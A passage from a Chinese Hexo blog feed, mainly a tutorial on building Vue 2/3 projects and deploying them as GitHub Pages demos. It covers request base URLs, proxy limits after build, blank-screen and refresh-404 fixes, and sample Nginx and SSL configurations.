</span><span style="color: #DCDCAA">Pay</span><span style="color: #D4D4D4"> = () </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">import</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'@/views/pay'</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">...</span></span></code></pre></div></div></figure><ul><li>路由中应用 </li></ul><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">router</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">new</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">VueRouter</span><span style="color: #D4D4D4">({</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">routes:</span><span style="color: #D4D4D4"> [</span></span><span class="line"><span style="color: #D4D4D4">    ...</span></span><span class="line"><span style="color: #D4D4D4">    {</span><span style="color: #9CDCFE">path:</span><span style="color: #CE9178">'prodetail/:id'</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">component:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">ProDetail</span><span style="color: #D4D4D4">},</span></span><span class="line"><span style="color: #D4D4D4">    {</span><span style="color: #9CDCFE">Path:</span><span style="color: #CE9178">'/Pay'</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">component:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">Pay</span><span style="color: #D4D4D4">},</span></span><span class="line"><span style="color: #D4D4D4">    ...</span></span><span class="line"><span style="color: #D4D4D4">  ]</span></span><span class="line"><span style="color: #D4D4D4">})</span></span></code></pre></div></div></figure><p>对比：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202409030451734.png" alt="image-20240903045130463"></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue 项目打包并部署到 GitHub 为 demo</title>
      <link href="/posts/31657.html"/>
      <url>/posts/31657.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><meta name="referrer" content="no-referrer"><meta name="description" content="Vue项目打包并部署到GitHub为demo，解决小白的一切打包困惑"><blockquote><p>目标：将打包好的 Vue2 | Vue3 项目部署到 <a href="https://docs.github.com/zh/pages/getting-started-with-github-pages/about-github-pages">github pages</a> 用作项目 demo</p></blockquote><p>我将尽可能的讲述打包前后可能遇到的绝大部分问题和原因，希望能有所帮助。</p><h2 id="打包前的问题"><a class="markdownIt-Anchor" href="#打包前的问题"></a> 打包前的问题</h2><p>打包其实实际上不会碰到什么大问题，我们讨论的问题实际是打包之后想要将打包结果也就是静态页面进行部署而发生的问题：</p><ol><li>白屏问题</li><li>刷新 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status">404</a> 问题</li><li>跨域问题</li></ol><p>但要想讨论上述问题，我们得研究好打包前的配置问题，也就是为什么会出现上述问题？</p><h3 id="请求地址配置问题"><a class="markdownIt-Anchor" href="#请求地址配置问题"></a> 请求地址配置问题</h3><p>首先我这里默认你的项目中二次封装了 <code>axios</code> 并配置了 <code>base</code> 请求基地址（别告诉我请求地址是 localhost 哈），那么你的请求配置方法可能是：</p><ol><li>主动暴露 base</li></ol><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C8C8C8">base</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">'http://your.domain.com'</span></span><span class="line"><span style="color: #C8C8C8">api</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">'/api/end-point'</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4"># </span><span style="color: #9CDCFE">The</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">final</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">request</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">form</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">may</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">look</span><span style="color: #D4D4D4"> </span><span style="color: #C8C8C8">like</span><span style="color: #D4D4D4">:</span></span><span class="line"><span style="color: #C8C8C8">http</span><span style="color: #D4D4D4">:</span><span style="color: #6A9955">//your.domain.com/api/end-point</span></span></code></pre></div></div></figure><p>或者你是这样配置的（环境为 Vue3+vite）：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C8C8C8">base</span><span style="color: #D4D4D4">: </span><span style="color: #C586C0">import</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">meta</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">env</span><span style="color: #D4D4D4">.</span><span style="color: #4FC1FF">VITE_BASE_URL</span></span><span class="line"><span style="color: #C8C8C8">api</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">'/api/end-point'</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4"># </span><span style="color: #9CDCFE">The</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">final</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">request</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">form</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">may</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">look</span><span style="color: #D4D4D4"> </span><span style="color: #C8C8C8">like</span><span style="color: #D4D4D4">:</span></span><span class="line"><span style="color: #C8C8C8">http</span><span style="color: #D4D4D4">:</span><span style="color: #6A9955">//your.domain.com/api/end-point</span></span></code></pre></div></div></figure><ol start="2"><li>配置 proxy 转发</li></ol><p>如果你并没有在二次封装 axios 的过程中暴露具体请求地址，而是配置了 proxy 进行代理转发，你的 proxy 配置可能是：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4"># </span><span style="color: #9CDCFE">vite</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">config</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">js</span></span><span class="line"><span style="color: #C8C8C8">devServer</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C8C8C8">proxy</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #CE9178">'/dev'</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">target:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'http://your.domain.com'</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">pathRewrite:</span><span style="color: #D4D4D4"> { </span><span style="color: #CE9178">'^/dev'</span><span style="color: #9CDCFE">:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">''</span><span style="color: #D4D4D4"> }</span></span><span class="line"><span style="color: #D4D4D4">      ......</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><p>配置 proxy 的开发环境下，只要请求匹配到 <code>/api</code> 就会把请求转发到 <code>target</code> 并且将 <code>/dev</code> 删除，浏览器请求为（假设你的项目运行在 8088 端口）：<code>http://localhost:8088/dev/api/end-point</code>，实际请求为：<code>http://your.domain.com/api/end-point</code></p><h3 id="proxy-的缺点"><a class="markdownIt-Anchor" href="#proxy-的缺点"></a> proxy 的缺点</h3><p>这两者在开发环境进行请求都没有问题，都能完成任务，但是一旦进行了打包，脚手架环境消失，这第 2 种配置方法就失效了，请求会只剩下 <code>/dev/api/end-point</code> 这种形式。</p><p>可能你会问：玩呢？这怎么发请求，我明明还是见到浏览器发出请求了啊，只不过失败了。</p><p>是的，<code>/dev/api/end-point</code> 这种形式的确不能正常发请求，不过浏览器会在只给出如 <code>/dev/api/end-point</code> 的形式的请求时，自动在前面拼接上下文环境，比如在本地测试项目，浏览器就会自动拼接上 <code>http://localhost:8088</code> 使得最终形式为：<code>http://localhost:8088/dev/api/end-point</code>。不过变成这种情况的话，基本也就无法部署了（本地部署除外），因为你已经失去了脚手架的 proxy 环境，不过你依然可以在 Vue 项目的同系统环境下使用 Nginx（类似 Nginx 的也行）尝试进行监听和转发，也就是反向代理。详情请见下节中的 <a href="#history%E4%BD%BF%E7%94%A8">history 使用</a>。</p><p>那么第 1 种配置方法会在打包之后发生什么问题吗？不会，它可以正常工作（除非请求地址是 localhost，如果为 localhost 则会引起跨域问题）。</p><h3 id="js-引入地址配置问题"><a class="markdownIt-Anchor" href="#js-引入地址配置问题"></a> Js 引入地址配置问题</h3><p>如果说请求地址影响着数据显示问题，那么 js 引入地址影响的是打包后的页面白屏问题。</p><p>这个问题基本上就是打包后的文件引入问题，我们应当将导出后的 js 等文件的引入地址配置为相对地址。</p><p>在 vite 或 vue-cli 中 <a id="js">应当配置</a> 如下：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4"># </span><span style="color: #9CDCFE">vite</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">config</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">js</span></span><span class="line"><span style="color: #C8C8C8">base</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">'./'</span><span style="color: #D4D4D4">,</span></span></code></pre></div></div></figure><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4"># </span><span style="color: #9CDCFE">vue</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">config</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">js</span></span><span class="line"><span style="color: #C8C8C8">publicPath</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">'./'</span><span style="color: #D4D4D4">,</span></span></code></pre></div></div></figure><blockquote><p>对于 vue2 的 vue-cli，官方文档中不推荐直接配置 <code>output.publicPath</code> 而是始终使用 **<code>publicPath</code>**</p></blockquote><p>这将使得打包后的 <code>index.html</code> 页面的 js 引入地址为相对地址，看起来就像这样：</p><figure class="shiki html"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">link</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">href</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"css/app.363852d2.css"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">rel</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"stylesheet"</span><span style="color: #D4D4D4"> </span><span style="color: #808080">/&gt;</span></span></code></pre></div></div></figure><p>请注意结果为 <code>css/app.363852d2.css</code> 而非 <code>/js/app.5bd045ab.js</code></p><h2 id="解决打包后的白屏问题"><a class="markdownIt-Anchor" href="#解决打包后的白屏问题"></a> 解决打包后的白屏问题</h2><p>出现白屏问题，白屏分为：</p><ol><li>跨域造成的</li><li> js 未正确引入造成的：没有配置成相对路径，详见 <a href="#js">js 配置</a></li><li>其他……</li></ol><h3 id="解决跨域问题"><a class="markdownIt-Anchor" href="#解决跨域问题"></a> 解决跨域问题</h3><blockquote><p>相关链接：<a href="https://cloud.tencent.com/developer/article/1953193">什么是跨域问题？</a></p></blockquote><p>其实也谈不上解决，毕竟这个问题不是真正的跨域问题，<strong>真正的跨域问题只靠前端不靠服务器是不可能解决的</strong>。</p><p>一般这种情况下的跨域问题主要是打包后的文件是以 file 协议进行读取的，而 file 协议不像 http (s) 协议支持跨域，所以控制台 CROS 跨域报错</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410102158577.png" alt="image-20241010215831443"></p><p>解决方案参考：<a href="https://blog.csdn.net/qq_34727886/article/details/136163494">vite 打包本地文件，file 类型 URL 引发跨域等问题探讨</a></p><p>但我不太推荐上面的解决方案，因为利用 Nginx（或其他网络服务器）的反向代理就够了。</p><p>详情见 <a href="#history">history 使用</a></p><h3 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h3><p>诚然，我不可能见过所有的白屏问题，所以欢迎探讨。</p><h2 id="解决打包后的刷新-404-问题"><a class="markdownIt-Anchor" href="#解决打包后的刷新-404-问题"></a> 解决打包后的刷新 404 问题</h2><p>为什么会出现有基本结构但是我刷新就报 404 错误呢？</p><p>这个问题的发生满足以下条件：</p><ol><li><p>配置了默认访问或 <code>/</code> 访问重定向到某具体路由页面，如 <code>/home</code></p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">// Vue2</span></span><span class="line"><span style="color: #C8C8C8">path</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">'/'</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #C8C8C8">redirect</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">'/home'</span><span style="color: #D4D4D4">,</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// Vue3</span></span><span class="line"><span style="color: #C8C8C8">path</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">'/'</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #C8C8C8">redirect</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">'/article/manage'</span><span style="color: #D4D4D4">,</span></span></code></pre></div></div></figure></li><li><p>配置了路由模式为不带<code>#</code>符号的 <code>history</code> 历史模式</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">// Vue2</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">router</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">new</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">VueRouter</span><span style="color: #D4D4D4">({</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">mode:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'history'</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">routes</span></span><span class="line"><span style="color: #D4D4D4">})</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">router</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// Vue3</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">router</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">createRouter</span><span style="color: #D4D4D4">({</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// history: createWebHashHistory()</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">history:</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">createWebHistory</span><span style="color: #D4D4D4">(),</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">routes</span></span><span class="line"><span style="color: #D4D4D4">})</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">router</span></span></code></pre></div></div></figure></li></ol><p>为什么说满足以上条件就会触发这个问题呢？</p><p>这是因为当你第一次访问项目，你的访问地址可能是：<code>http://localhost:8088</code> 或者 <code>http://localhost:8088/</code> 而因为你的项目满足第一条，所以你的项目自动重定向到了你指定的某个具体路由页面，比如：<code>http://localhost:8088/home</code></p><p>如果你按照上述方式访问，这个时候为第一次访问，是没有任何问题的，js 正常加载，页面正常显示。一旦当你刷新之后，访问地址就变成了 <code>http://localhost:8088/home</code></p><p>这是什么地址？浏览器会认为 <code>/home</code> 是一个后端路由地址将其携带到后端服务器：” 嘿哥们，你这儿有这样一个路由地址吗？“，然而后端实际上没有这样一个路由能匹配，于是就造成了 <code>404 not found</code> 的结果。</p><p>那为什么别人做的网站 / 项目不会这样呢？当然是因为别人已经配置过了，没有经过正确配置之前，人人都一样的。</p><p>那是不是 Hash 哈希模式就可以呢？是的，hash 模式可以解决这个问题。</p><p>这是因为设置为 hash 模式后，如果有 <code>http://your.domain.com/#/homepage</code> 这样一个地址，那么其中的<code>#/homepage</code> 就是 <code>hash</code> 值，<code>hash</code> 值只在客户端（如浏览器）中使用，是不会带给服务器的，所以使用 <code>hash</code> 模式时，不存在刷新 <code>404</code> 问题。</p><h2 id="怎么使用-history-模式"><a class="markdownIt-Anchor" href="#怎么使用-history-模式"></a> 怎么使用 history 模式</h2><p>我不想出现 404 错误，我也不想使用 Hash 模式，我该怎么使用 <code>history</code> 模式来让网站变得更优雅呢？</p><p>思路：让服务器那边在收到未配置的 <code>GET</code> 路由时，都返回 <code>index.html</code> 即可。</p><p>什么意思呢？如果浏览器将这样一个后端不认识的路由真的带给了服务器，那么服务器就把 <code>index.html</code> 塞回去，<code>index.html</code> 回去了意味着它所引入的 js 就工作了，js 工作了那么前端路由就活过来了，于是就可以正确处理路由地址了，<code>404 not found</code> 问题也就迎刃而解了。</p><p>这也是为什么某些文章中使用 <a href="https://nginx.org/">Nginx</a> 配置里有 <code>try_files $uri $uri/ /index.html;</code> 存在了。</p><p>换句话说，如果你是<strong>本地部署</strong><a id="history">使用 Nginx</a>，它可以解决你的刷新 404 问题，并且，Nginx 也能解决打包后 <code>proxy</code> 失效带来的请求问题，配置 <code>conf/nginx.conf</code> 如下：</p><ul><li>请注意 Nginx 的根目录最好<strong>不要是 C 盘</strong>，防止权限不足 </li></ul><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">http {</span></span><span class="line"><span style="color: #D4D4D4">...略...</span></span><span class="line"><span style="color: #D4D4D4"></span></span><span class="line"><span style="color: #D4D4D4">server {</span></span><span class="line"><span style="color: #D4D4D4">...略...</span></span><span class="line"><span style="color: #D4D4D4"></span></span><span class="line"><span style="color: #D4D4D4">    # 配置Nginx监听的项目根地址</span></span><span class="line"><span style="color: #D4D4D4">    location / {</span></span><span class="line"><span style="color: #D4D4D4">        try_files $uri $uri/ /index.html;</span></span><span class="line"><span style="color: #D4D4D4">        # Vue3项目的打包目录</span></span><span class="line"><span style="color: #D4D4D4">        root D:/your/own/dist;</span></span><span class="line"><span style="color: #D4D4D4">        index index.html; # 默认首页文件名</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">    # 配置请求转发</span></span><span class="line"><span style="color: #D4D4D4">    location /dev/ {</span></span><span class="line"><span style="color: #D4D4D4">    # 配置请求监听到之后的转发目标</span></span><span class="line"><span style="color: #D4D4D4">    proxy_pass http://your.domain.com</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><blockquote><p>相关链接：<a href="https://nginx.org/en/download.html">Nginx 下载</a></p></blockquote><h3 id="github-pages-上的-history-路由模式可行性"><a class="markdownIt-Anchor" href="#github-pages-上的-history-路由模式可行性"></a> GitHub Pages 上的 history 路由模式可行性</h3><h3 id="我的看法"><a class="markdownIt-Anchor" href="#我的看法"></a> 我的看法</h3><p>相信看过上面你已经想到了：我能不能对部署在 GItHub 上的 demo 也这样配置？</p><p>我只能说，我没试过，但我觉得不行：<strong>因为 Nginx 和 demo 不在同一个系统环境</strong>。</p><p>上述配置能成的根本原因是：在前端将路由也带来的情况下，Nginx 进行监听并匹配成功，然后将 <code>index.html</code> 进行返回。</p><p>这里的重点在于，Nginx <strong>要能成功监听</strong>到项目的根地址，但对于部署到 GitHub 上的 demo 来说，浏览器会直接向 GitHub Pages 请求资源，而 GitHub Pages 只支持静态文件托管，它是<strong>没有针对 <code>history</code> 模式的服务端配置</strong>的。</p><p>而且，我总不可能将 Nginx 也部署到 GitHub 上吧？</p><h3 id="一个可能的方法"><a class="markdownIt-Anchor" href="#一个可能的方法"></a> 一个可能的方法</h3><p>不过，ChatGPT 有一个它的解决办法：在 <code>dist</code> 打包<strong>目录内</strong>中加入一个 <code>404.html</code> 页面用于手动返回 <code>index.html</code></p><figure class="shiki html"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">script</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">type</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"text/javascript"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// 如果页面找不到路径，重定向到index.html，让Vue处理</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">var</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">redirect</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">window</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">location</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">pathname</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">window</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">location</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">href</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">"/index.html?redirect="</span><span style="color: #D4D4D4"> + </span><span style="color: #9CDCFE">redirect</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><p>我无法验证该方法的可行性，因为我已经将我的 <code>pages</code> 给我生成的域名用来部署了 <code>hexo</code> 博客，我的所有其他仓库的 <code>pages</code> 项目都是在该域名下，这导致我的 demo 无法使用该方法，我也就无法验证了。</p><blockquote><p>相关链接：<a href="https://runoneall.github.io/%E9%80%9A%E8%BF%87Github-Pages-Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B.html">GitHub Pages 部署 hexo 静态博客</a> -<a href="https://github.com/fluid-dev/hexo-theme-fluid">Fluid</a> 主题</p><p>我参考的那篇文章找不到了……</p></blockquote><h3 id="一个可能需要的配置参考"><a class="markdownIt-Anchor" href="#一个可能需要的配置参考"></a> 一个可能需要的配置参考</h3><p>别忘了给你的 <code>Nginx</code> 服务器加上 <code>ssl监听</code>并正确转发请求（<a href="https://www.runoob.com/w3cnote/https-ssl-intro.html">什么是 ssl 证书？</a>），因为 GItHub 的网络环境是 https 的，如果你发送 http 请求，浏览器将会进行拦截。</p><blockquote><p>可自行搜索需要的免费 ssl 证书签发厂家，如果你的远程服务器没有域名，那么你需要的 ssl 证书为 ip 证书，我使用的正是这种类型，可以搜索：<a href="https://cn.bing.com/search?q=zerossl">zerossl</a></p></blockquote><p>我的 <code>Nginx</code> 配置示例如下：</p><figure class="shiki text"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4"></span></span><span class="line"><span style="color: #D4D4D4">#user  nobody;</span></span><span class="line"><span style="color: #D4D4D4">worker_processes  4;</span></span><span class="line"><span style="color: #D4D4D4"></span></span><span class="line"><span style="color: #D4D4D4">#error_log  logs/error.log;</span></span><span class="line"><span style="color: #D4D4D4">#error_log  logs/error.log  notice;</span></span><span class="line"><span style="color: #D4D4D4">#error_log  logs/error.log  info;</span></span><span class="line"><span style="color: #D4D4D4"></span></span><span class="line"><span style="color: #D4D4D4">#pid        logs/nginx.pid;</span></span><span class="line"><span style="color: #D4D4D4"></span></span><span class="line"><span style="color: #D4D4D4">events {</span></span><span class="line"><span style="color: #D4D4D4">    worker_connections  1024;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #D4D4D4"></span></span><span class="line"><span style="color: #D4D4D4">http {</span></span><span class="line"><span style="color: #D4D4D4">    # 监听 HTTP 请求并重定向到 HTTPS</span></span><span class="line"><span style="color: #D4D4D4">    server {</span></span><span class="line"><span style="color: #D4D4D4">        listen 80;  # 监听 HTTP</span></span><span class="line"><span style="color: #D4D4D4">        server_name your_domain;  # 替换为你的域名或 IP</span></span><span class="line"><span style="color: #D4D4D4"></span></span><span class="line"><span style="color: #D4D4D4">        # 强制 HTTP 到 HTTPS 重定向</span></span><span class="line"><span style="color: #D4D4D4">        return 301 https://$host$request_uri;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4"></span></span><span class="line"><span style="color: #D4D4D4">    # 监听 HTTPS 请求</span></span><span class="line"><span style="color: #D4D4D4">    server {</span></span><span class="line"><span style="color: #D4D4D4">        listen 443 ssl;  # 监听 HTTPS</span></span><span class="line"><span style="color: #D4D4D4">        server_name your_domain;  # 替换为你的域名或 IP</span></span><span class="line"><span style="color: #D4D4D4"></span></span><span class="line"><span style="color: #D4D4D4">        ssl_certificate C:/ssl/certificate.crt;  # SSL 证书路径</span></span><span class="line"><span style="color: #D4D4D4">        ssl_certificate_key C:/ssl/private.key;  # SSL 私钥路径</span></span><span class="line"><span style="color: #D4D4D4"></span></span><span class="line"><span style="color: #D4D4D4">        ssl_protocols TLSv1.2 TLSv1.3;  # 启用的 SSL 协议</span></span><span class="line"><span style="color: #D4D4D4">        ssl_ciphers HIGH:!aNULL:!MD5;  # 启用的加密算法</span></span><span class="line"><span style="color: #D4D4D4"></span></span><span class="line"><span style="color: #D4D4D4">        location / {</span></span><span class="line"><span style="color: #D4D4D4">            root C:/my/test;  # 指定网站根目录</span></span><span class="line"><span style="color: #D4D4D4">            index flag.txt;  # 默认主页文件</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"><span style="color: #D4D4D4"></span></span><span class="line"><span style="color: #D4D4D4">        location /api 